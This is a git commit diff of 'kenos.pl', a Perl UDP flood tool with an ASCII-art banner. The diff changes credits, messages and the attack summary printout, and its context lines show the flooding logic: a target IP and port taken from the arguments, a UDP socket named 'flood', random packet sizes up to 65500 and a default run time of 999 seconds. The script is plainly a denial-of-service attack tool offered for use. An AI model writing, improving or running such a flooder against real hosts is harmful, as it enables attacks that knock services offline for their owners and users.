f3cdbfcfae36b6f914f04b7dc39d352376bf5853
D3fe4ted <73515265+d3fe4ted@users.noreply.github.com>
2022-04-10 16:45:09 -0700

    Update kenos.pl

--- kenos.pl
+++ kenos.pl
@@ -1,4 +1,4 @@
-#By DeaKenas / Github.com
+#By D3fe4ted / Github.com / Revamped made it a little cleaner
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
 
@@ -9,7 +9,7 @@ my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Failed to slam $ip\n";
+$iaddr = inet_aton("$ip") or die "Failed to slam, Or Incorect Usage $ip\n";
 $endtime = time() + ($time ? $time : 999);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
@@ -26,10 +26,13 @@ print " ██ ▄█▀▓█████  ███▄    █  ▒████
 ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░░ ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
 ░  ░      ░  ░         ░     ░ ░        ░  
-    KEN0S Slammed $ip " . ($port ? $port : "On random ports") . " With " . 
-  ($size ? "$size-Slammed" : " PPS: 65500") . " Data: 63kbps" . 
+   
+             - Kenos Summary -
+        | IP: $ip \n        | Port: " . 
+  ( $port ? $port : "Random") . "\n        " . 
+  ($size ? "| Packets: $size" : "| Packets: Random") . "" . 
   ($time ? " for $time seconds" : "") . "\n";
-print "Stop slamming with Ctrl-C\n" unless $time;
+print "\n         Stop slamming with Ctrl + C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(65500-64)+64) ;
